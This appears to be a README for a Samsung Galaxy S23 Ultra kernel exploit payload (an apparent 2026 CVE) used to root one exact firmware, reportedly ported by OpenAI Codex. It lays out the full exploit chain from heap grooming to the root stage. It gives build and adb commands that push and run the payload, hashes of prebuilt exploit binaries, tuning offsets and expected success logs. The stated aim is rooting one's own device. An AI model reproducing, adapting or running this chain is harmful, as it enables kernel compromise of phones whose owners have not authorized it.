# SM-S918B / S918BXXSAFZF5 experimental payload

> **AI disclosure:** OpenAI Codex prepared this port, QEMU validation record,
> and test guide under `@johnny-salz`'s direction. QEMU tests were automated.
> The complete payload has not yet been validated on a real SM-S918B FZF5.

This is an experimental payload for this exact target:

```text
Model:       SM-S918B (dm3q)
Build:       S918BXXSAFZF5
Fingerprint: samsung/dm3qxxx/dm3q:16/BP4A.251205.006/S918BXXSAFZF5:user/release-keys
Kernel:      5.15.189-android13-8-33413713-abS918BXXSAFZF5
```

Do not try it on another firmware. Use it only on a device you own or are
explicitly authorized to test. A failed attempt can panic and reboot the
phone. Wait about one or two minutes after boot before starting a test.

The profile is intentionally absent from `support/targets-v3.json` until a
device owner validates the complete path. The files under `artifacts/` are test
candidates, not a released support-feed entry.

## What changed

The app payload now has one shared fake `rt_mutex_waiter` builder and two
selectable stack-writer backends:

```text
rootless P0 fingerprint and KernelSnitch
  -> controlled complete mm_struct slab group
  -> deterministic 24-slab drain
  -> SKB reclaim
  -> MCAST or SIGRETURN writes the same fake waiter
  -> ashmem fops replacement
  -> configfs arbitrary read/write
  -> pipe physical read/write
  -> kernel usermode-helper root stage
```

- `mcast` copies a native 264-byte `group_source_req`. Real-device trace and
  disassembly place the waiter at `buffer + 0x40`. The `setsockopt` call must be
  the last syscall made by that worker before the stale waiter is consumed.
- `sigreturn` copies the waiter through the signal frame. It detects the
  signal-frame layout and uses `FPSIMD + 0x18` without SVE or `SVE + 0x28` when
  SVE is active.

The production payload does not use tracefs, `perf_event_open`, or a QEMU
oracle. Pselect is not a writer backend for this target.

## Ready-built test payloads

| Backend | File | SHA-256 | Size |
| --- | --- | --- | --- |
| MCAST | `artifacts/dm3q-S918BXXSAFZF5/cve-2026-43499-app.so` | `63076e77cf73d24e7314ad52611594726a61a282e08669c7e2822faf0c3b7c7c` | 104128 bytes |
| SIGRETURN | `artifacts/dm3q-S918BXXSAFZF5/cve-2026-43499-app-sigreturn.so` | `b8f63805c15a0f5276fb451e2e836cdb3653d6fe088e394ececb4e1d23516c38` | 104128 bytes |

Verify the hash before each test so the log can be tied to the right backend.

## Build both variants

An Android NDK with an `aarch64-linux-android35-clang` toolchain is required.
The commands below keep the two outputs separate:

```sh
make TARGET=dm3q-S918BXXSAFZF5 \
  STACK_WRITER=mcast \
  OUTDIR=build/dm3q-S918BXXSAFZF5-mcast \
  ANDROID_NDK_HOME=/path/to/android-ndk \
  release

make TARGET=dm3q-S918BXXSAFZF5 \
  STACK_WRITER=sigreturn \
  OUTDIR=build/dm3q-S918BXXSAFZF5-sigreturn \
  ANDROID_NDK_HOME=/path/to/android-ndk \
  release
```

The results are:

```text
build/dm3q-S918BXXSAFZF5-mcast/cve-2026-43499-app.release.so
build/dm3q-S918BXXSAFZF5-sigreturn/cve-2026-43499-app.release.so
```

## Fast ADB shell test without an APK

This runs the same app payload constructor through the repository's common
`--run-payload` loader. It is useful for a quick end-to-end writer, ARW,
physrw, and root test before rebuilding the APK. It runs as `uid=2000` in the
shell SELinux domain, so it does not prove that the app-domain launch is good.

Build the selected payload and its loader in one command:

```sh
make TARGET=dm3q-S918BXXSAFZF5 \
  STACK_WRITER=mcast \
  OUTDIR=build/dm3q-fzf5-shell \
  ANDROID_NDK_HOME=/path/to/android-ndk \
  shell-bundle
```

Use `STACK_WRITER=sigreturn` instead to test the backup. The two files needed
on the phone are:

```text
build/dm3q-fzf5-shell/cve-2026-43499-app.release.so
build/dm3q-fzf5-shell/cve-2026-43499-root
```

On Windows PowerShell, set the exact serial shown by `adb devices`, then push,
verify, and run:

```powershell
$serial = 'YOUR_DEVICE_SERIAL'
$out = 'build\dm3q-fzf5-shell'
$remotePayload = '/data/local/tmp/rmg-s918b-fzf5-app.so'
$remoteRunner = '/data/local/tmp/rmg-cve43499-root'
$remoteLog = '/data/local/tmp/rmg-s918b-fzf5-shell.log'

adb -s $serial push "$out\cve-2026-43499-app.release.so" $remotePayload
adb -s $serial push "$out\cve-2026-43499-root" $remoteRunner
adb -s $serial shell "chmod 0644 $remotePayload; chmod 0755 $remoteRunner; rm -f $remoteLog; toybox sha256sum $remotePayload $remoteRunner"

adb -s $serial shell "EXPLOIT_ATTEMPTS=24 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 $remoteRunner --run-payload $remotePayload $remoteRunner $remoteLog"

adb -s $serial pull $remoteLog .\rmg-s918b-fzf5-shell.log
```

The runner mirrors the payload log to the current terminal and keeps the full
copy at `$remoteLog`. If ADB drops, reconnect and pull that file. The app
payload waits until boot uptime reaches 120 seconds, so a command started early
may first print a boot quiet-window wait.

Success has the same stage markers as the APK test, but the last line normally
shows `uid=2000->0` instead of `uid=10000->0`. Test one writer per boot when
kernel state after a failed run is not known. If shell succeeds but APK fails,
the next comparison is app-domain SELinux/seccomp and launch state, not the
shared writer or downstream root chain.

## Test from a locally built Root My Galaxy APK

The current app already accepts `SM-S918B` with kernel `5.15.189` through the
existing `dm3q-S9180ZHS8FZF5` profile. For a local test only, its bundled asset
slot can carry this candidate. This is just a local transport slot: do not
rename or publish the SM-S918B file as the SM-S9180 payload.

On Windows PowerShell, clone both repositories and set their paths:

```powershell
$payloadRepo = 'C:\path\to\Root-My-Galaxy-Payloads'
$appRepo = 'C:\path\to\Root-My-Galaxy'
$assetDir = Join-Path $appRepo 'app\src\main\assets\payloads\dm3q-S9180ZHS8FZF5'
New-Item -ItemType Directory -Force $assetDir | Out-Null
```

### MCAST test

```powershell
Copy-Item -Force `
  (Join-Path $payloadRepo 'artifacts\dm3q-S918BXXSAFZF5\cve-2026-43499-app.so') `
  (Join-Path $assetDir 'cve-2026-43499-app.so')
Get-FileHash (Join-Path $assetDir 'cve-2026-43499-app.so') -Algorithm SHA256
```

The hash must be
`63076e77cf73d24e7314ad52611594726a61a282e08669c7e2822faf0c3b7c7c`.

### SIGRETURN test

Replace the same canonical app asset with the backup backend:

```powershell
Copy-Item -Force `
  (Join-Path $payloadRepo 'artifacts\dm3q-S918BXXSAFZF5\cve-2026-43499-app-sigreturn.so') `
  (Join-Path $assetDir 'cve-2026-43499-app.so')
Get-FileHash (Join-Path $assetDir 'cve-2026-43499-app.so') -Algorithm SHA256
```

The hash must be
`b8f63805c15a0f5276fb451e2e836cdb3653d6fe088e394ececb4e1d23516c38`.

After selecting one backend, build and install the debug APK:

```powershell
$env:JAVA_HOME = 'C:\Program Files\Android\Android Studio\jbr'
Push-Location $appRepo
.\gradlew.bat :app:assembleDebug
adb install -r .\app\build\outputs\apk\debug\app-debug.apk
Pop-Location
```

Open Root My Galaxy, enable the advanced device selector if needed, select the
Galaxy S23 Ultra profile with kernel `5.15.189`, and run the install flow. Test
one backend per APK build. If kernel state is uncertain after a failed attempt,
reboot and wait one or two minutes before the next run.

## Capture logs

Start logcat before pressing the app button:

```powershell
adb logcat -c
adb logcat -v threadtime > s918b-fzf5-logcat.txt
```

Stop it with Ctrl+C after success, failure, or reboot. For the debug APK, also
extract the payload's own log:

```powershell
adb exec-out run-as dev.busung.s25uroot cat files/exploit.log > s918b-fzf5-exploit.log
```

If the phone rebooted, collect post-crash data that the firmware exposes:

```powershell
adb pull /sys/fs/pstore .\pstore
adb exec-out cat /proc/last_kmsg > s918b-fzf5-last-kmsg.txt
```

Some Samsung builds instead retain
`/data/log/dumpstate_latest_lastkmsg.log.gz`. Upload it if it is readable. A
useful report includes the exact model, build, kernel string, selected backend,
payload SHA-256, full exploit log, full logcat, and any pstore/last-kmsg data.

## Expected log path

The key success markers are:

```text
build config ... stack_writer=mcast|sigreturn
controlled mm group full
controlled mm group selected
controlled mm trigger ready
controlled skb reclaim
kernel page prepare
slide mcast returned offset=0x40 ... sched_ok=1
slide sigreturn returned offset=0x18|0x28 ... fpsimd=1 sve=0|1 ... sched_ok=1
p0 physical write status=0 ok=1
cfi write ret=35
cfi read ret=35
phys step pipe probe found=1
phys step probed read done ok=1
phys step probed write done ok=1
phys step read64 done ok=1
root umh result ... complete=1 retval=0 socket=1
pipe physrw ... done=1 root=1 ... uid=10000->0
```

The app should end with `exploit completed`. The final payload summary must
contain `done=1 root=1`.

## Parameters to tune

All compile-time values below are in
`src/targets/dm3q-S918BXXSAFZF5/target.h`:

| Parameter | Default | What it controls / what to inspect |
| --- | ---: | --- |
| `S918_PAGE_SCAN_MAX` | 256 | Maximum pages checked by the P0 fingerprint search. Raise only if logs exhaust the scan without a fingerprint match. |
| `S918_KSNITCH_HINT_COLLISIONS` | 2 | Cheap KernelSnitch prefilter. False negatives here mean the full test never runs. |
| `S918_KSNITCH_FULL_COLLISIONS` | 5 | Strong KernelSnitch acceptance count. Lower values admit more false candidates; higher values can reject a noisy but real candidate. |
| `APPENDED_FUTEXES` | 2048 | KernelSnitch collision amplifier size. More work costs memory and time. |
| `REPEAT_MEASUREMENT` | 64 | Repeats per timing sample. Raise when candidate timings overlap baseline noise. |
| `AVERAGE` | 8 | Timing aggregate count. Inspect the printed baseline and candidate spread before changing it. |
| `KERNELSNITCH_BASELINE_SAMPLES` | 8 | Baseline sample count. |
| `KERNELSNITCH_BASELINE_QUANTILE` | 1 | Baseline quantile index. |
| `S918_DMA32_SKIP_SLABS` | 8 | Complete mm_struct slabs skipped before selecting the controlled group. Change only when logs show the group in the wrong physical zone. |
| `S918_TRIGGER_SLABS` | 24 | Full slabs used to force the Samsung SLUB drain. Reduce only if the log proves discard; raise if the selected slab stays frozen. |
| `S918_SKB_SENDS` | 256 | SKB reclaim sends. Raise if drain succeeds but reclaim never confirms. |
| `S918_SKB_SNDBUF` | 8388608 | Socket send buffer for the reclaim spray. |
| `S918_RECLAIM_SOCKET_PAIRS` | 32 | Socket pairs retained for reclaim. More pairs trade memory for coverage. |
| `MCAST_WAITER_OFF` | 0x40 | Real SM-S918B native MCAST stack offset. Do not tune blindly; a crash trace or disassembly must justify a change. |
| `SIGRETURN_FPSIMD_WAITER_OFF` | 0x18 | Waiter offset in the no-SVE FPSIMD record. |
| `SIGRETURN_SVE_WAITER_OFF` | 0x28 | Waiter offset in the SVE signal record. |

`SLIDE_ENTER_DELAY_USEC` (legacy alias: `PSELECT_DELAY_USEC`) controls the
writer-entry delay. `SLIDE_P0_OFFSET` forces a per-boot offset and is unsafe if
guessed wrong; leave it unset for normal tests. Never change several tuning
values at once: preserve the full before/after logs so a result can be
attributed to one change.

## QEMU validation record

The target was rehosted with the exact Samsung kernel image for
`5.15.189-android13-8-33413713-abS918BXXSAFZF5` (raw Image SHA-256
`45e16fc602498f89e8ba5ab6da3109eccf04023bb69e916ab596a903da477bfd`).

With a QEMU-only exact-mm allocation oracle, the current source completed the
full chain for:

- MCAST;
- SIGRETURN with SVE (`waiter offset 0x28`);
- SIGRETURN without SVE (`waiter offset 0x18`).

Each successful run reached configfs read/write, pipe read/write/read64, the
kernel usermode-helper stage, and `uid=10000 -> 0`, then powered off cleanly.
The SIGRETURN SVE run also had one earlier post-writer pipe-reclaim miss; its
retry completed. This shows why each stage has separate log gates.

The QEMU rehost's MCAST wrapper has different stack geometry and used a
harness-only `0x78` override. It validates the MCAST backend and the rest of the
shared chain, not the real-device `0x40` placement. The release value `0x40`
comes from the real SM-S918B trace and matching disassembly.

The active routes also completed fully rootless QEMU runs without tracefs,
perf, or the exact-mm oracle before unrelated dead test code was removed. A
current-source rootless retry later timed out in the KernelSnitch timing search
without crashing. That is expected to be less deterministic under emulation;
it is not counted as real-hardware validation.
